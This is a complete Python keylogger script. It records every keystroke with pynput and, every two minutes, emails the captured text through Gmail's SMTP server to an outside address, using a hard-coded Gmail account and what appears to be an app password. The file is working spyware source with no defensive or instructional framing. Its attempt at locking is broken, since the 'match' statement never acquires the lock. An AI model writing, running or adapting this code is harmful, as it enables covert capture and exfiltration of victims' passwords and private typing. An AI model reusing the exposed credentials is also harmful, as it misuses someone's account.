
import smtplib
from pynput.keyboard import Key, Listener
import threading

email = 'thailxag1122@gmail.com'
password = 'fnlcdzwttgziavdf' 

full_log = ''
word = ''
# Biến lock để tránh xung đột khi nhiều luồng cùng truy cập full_log
log_lock = threading.Lock()

def on_press(key):
    global word
    global full_log
    
    match log_lock:
        case _:
            if key == Key.space or key == Key.enter:
                word += ' '
                full_log += word
                word = ''
            elif key == Key.shift_l or key == Key.shift_r:
                return
            elif key == Key.backspace:
                word = word[:-1]
            else:
                try:
                    char = key.char
                    if char is not None:
                        word += char
                except AttributeError:
                    pass

    if key == Key.esc:
        return False

def send_log():
    global full_log
    
    log_to_send = ""
    match log_lock:
        case _ if full_log:
            log_to_send = full_log
            full_log = ""

    if log_to_send:
        print(f"Preparing to send log: {log_to_send}")
        try:
            session = smtplib.SMTP('smtp.gmail.com', 587)
            session.starttls()
            session.login(email, password)
            session.sendmail(email, 'thaimoblxag1122@gmail.com', log_to_send.encode('utf-8'))
            session.quit()
            print("Log sent successfully!")
        except Exception as e:
            print(f"Error sending email: {e}")

    threading.Timer(120.0, send_log).start()

if __name__ == "__main__":
    listener = Listener(on_press=on_press)
    listener.start()
    
    send_log()
    
    listener.join()